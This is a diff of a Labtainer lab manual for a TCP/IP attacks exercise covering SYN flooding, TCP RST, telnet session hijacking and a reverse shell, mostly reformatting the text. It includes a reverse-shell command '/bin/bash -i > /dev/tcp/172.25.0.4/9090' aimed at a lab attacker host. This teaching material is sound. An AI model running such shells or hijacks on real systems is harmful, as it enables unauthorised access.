@@ -27,7 +27,7 @@ Navigate to the “labtainer-student” directory and start the lab using the
 command:
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
->   labtainer tcpip
+$  labtainer tcpip
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 -   Links to this lab manual will be displayed if you wish to view the prompt
@@ -57,10 +57,9 @@ Lab Tasks
 In this lab, students will conduct attacks on the TCP/IP protocols. They will
 use the nping tool in the attacks.
 
-To simplify the “guess” of TCP sequence numbers and source port numbers, we
-assume that attackers are on the same physical network as the victims. You are provided with the
-Wireshark tool on the server to represent the ability to sniff traffic on the network. The following is the
-list of attacks that need to be implemented.
+To simplify the “guess” of TCP sequence numbers and source port numbers, we assume that attackers are on the same physical network as the victims. You are provided with the
+Wireshark tool on the server to represent the ability to sniff traffic on the network. The following is the list of attacks that need to be implemented.
+
 ```
 client
 
@@ -155,112 +154,52 @@ is under the SYN flooding
 
 attack. You can use the sysctl command to turn on/off the SYN cookie mechanism:
 ```
-sudo sysctl -a \| grep cookie (Display the SYN cookie flag)
+sudo sysctl -a | grep cookie (Display the SYN cookie flag)
 
 sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
 
 sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
 ```
 Please run your attacks with the SYN cookie mechanism on and off, and compare
-the results. In your
-
-report, please describe why the SYN cookie can effectively protect the machine
-against the SYN flooding
-
-attack. How might the nping tool be used to create an actual attack (rather than
-sending one packet at a
-
-time?) If your instructor does not cover the mechanism in the lecture, you can
-find out how the SYN
-
-cookie mechanism works from the Internet.
+the results. Why does the SYN cookie can effectively protect the machine against the SYN flooding attack? How might the nping tool be used to create an actual attack (rather than sending one packet at a time?)
 
 TCP RST Attacks on telnet and ssh Connections
 =====
 
 The TCP RST Attack can terminate an established TCP connection between two
-victims. For example, if
-
-there is an established telnet connection (TCP) between two users A and B,
-attackers can spoof a RST
-
-packet from A to B, breaking this existing connection. To succeed in this
-attack, attackers need to
-
-correctly construct the TCP RST packet.
+victims. For example, if there is an established telnet connection (TCP) between two users A and B, attackers can spoof a RST packet from A to B, breaking this existing connection. To succeed in this attack, attackers need to correctly construct the TCP RST packet.
 
 In this task, you need to launch an TCP RST attack to break an existing telnet
-connection between the
+connection between the client and the server. After that, try the same attack on an ssh connection.
+Observe your results.
 
-client and the server. After that, try the same attack on an ssh connection.
-Please describe your
-
-observations. To simplify the lab, we assume that the attacker and the victim
-are on the same LAN, i.e.,
-
-the attacker can observe the TCP traffic between the client and the server via
-use of Wireshark on the
-
-server. Note: when you use Wireshark to observe the network traffic, you should
+To simplify the lab, we assume that the attacker and the victim
+are on the same LAN, i.e., the attacker can observe the TCP traffic between the client and the server via
+use of Wireshark on the server. Note: when you use Wireshark to observe the network traffic, you should
 be aware that when
 
 Wireshark displays the TCP sequence number, by default, it displays the relative
-sequence number, which
-
-equals to the actual sequence number minus the initial sequence number. If you
-want to see the actual
-
-sequence number in a packet, you need to right click the TCP section of the
+sequence number, which equals to the actual sequence number minus the initial sequence number. If you
+want to see the actual sequence number in a packet, you need to right click the TCP section of the
 Wireshark output, and select
 
 "Protocol Preference". In the popup window, uncheck the "Relative Sequence
 Number" option.
 
-You will use packet spoofing to forge a reset packet. Use the nping tool to
-create a spoofed packet with
-
-the RST flag set. Note you will need to provide an appropriate sequence number
-and source port number.
+You will use packet spoofing to forge a reset packet. Use the nping tool to create a spoofed packet with the RST flag set. Note you will need to provide an appropriate sequence number and source port number.
 
 TCP Session Hijacking
 =====
 
-The objective of the TCP Session Hijacking attack is to hijack an existing TCP
-connection (session)
-
-between two victims by injecting malicious contents into this session. If this
-connection is a telnet
-
-session, attackers can inject malicious commands (e.g. deleting an important
-file) into this session,
-
-causing the victims to execute the malicious commands. Figure 3 depicts how the
-attack works. In this
-
-task, you need to demonstrate how you can hijack a telnet session between two
-computers. Your goal is to
-
-get the telnet server to run a malicious command from you. For the simplicity of
-the task, we assume that
-
-the attacker and the victim are on the same LAN.
+The objective of the TCP Session Hijacking attack is to hijack an existing TCP connection (session) between two victims by injecting malicious contents into this session. If this connection is a telnet session, attackers can inject malicious commands (e.g. deleting an important file) into this session, causing the victims to execute the malicious commands. Figure 3 depicts how the attack works. In this task, you need to demonstrate how you can hijack a telnet session between two computers. Your goal is to get the telnet server to run a malicious command from you. For the simplicity of the task, we assume that the attacker and the victim are on the same LAN.
 
 You will again use packet spoofing (nping) to perform this task. Use the –data
-option to send your
+option to send your payload. Your attacker home directory includes a “hexify.py” script that creates hex versions of ascii text. You will also want to provide the psh and ack flags, and ack the previous packet in your spoofed packet. Your goal is to use a spoofed packet to hijack a telnet session and delete the file on the server at 
+```
+/~/documents/delete-this.txt. 
+```
 
-payload. Your attacker home directory includes a “hexify.py” script that creates
-hex versions of ascii
-
-text. You will also want to provide the psh and ack flags, and ack the previous
-packet in your spoofed
-
-packet. Your goal is to use a spoofed packet to hijack a telnet session and
-delete the file on the server at \~/
-
-documents/delete-this.txt. Note that if you use your telnet session to delete
-that file, e.g., to observe the
-
-protocol in wireshark, then you must recreate that file so it can be deleted in
+Note that if you use your telnet session to delete that file, e.g., to observe the protocol in wireshark, then you must recreate that file so it can be deleted in
 a hijacked session.
 
 **Figure 3: TCP Session Hijacking Attack**
@@ -269,9 +208,7 @@ Creating Reverse Shell using TCP Session Hijacking
 =====
 
 When attackers are able to inject a command to the victim’s machine using TCP
-session hijacking, they
-
-are not interested in running one simple command on the victim machine; they are
+session hijacking, they are not interested in running one simple command on the victim machine; they are
 interested in running
 
 many commands. Obviously, running these commands all through TCP session
@@ -339,7 +276,7 @@ the stdin for the shell to be obtained from the tcp connection.
 • "2\>&1": File descriptor 2 represents standard error stderr. This causes the
 error output to be redirected to the tcp connection.
 
-In summary, "/bin/bash -i \> /dev/tcp/172.25.0.4/9090 0\<&1 2\>&1" starts a bash
+In summary, "/bin/bash -i > /dev/tcp/172.25.0.4/9090 0<&1 2>&1" starts a bash
 shell, with its input coming from a tcp connection, and its standard and error outputs being
 redirected to the same tcp connection. In Figure 4(a), when the bash shell command is executed on the
 server (172.25.0.2), it connects back to the netcat process started on 172.25.0.4. This is confirmed via
@@ -363,12 +300,12 @@ additional terminal from the
 Linux terminal window from which your ran the “start.py” command. From there
 type:
 ```
-moreterm.py tcpip attacker
+$ moreterm.py tcpip attacker
 ```
 Lab Completion
 =====
 After finishing the lab, go to the terminal on your Linux system that was used
 to start the lab and type:
 ```
-stoplab tcpip
+$ stoplab tcpip
 ```
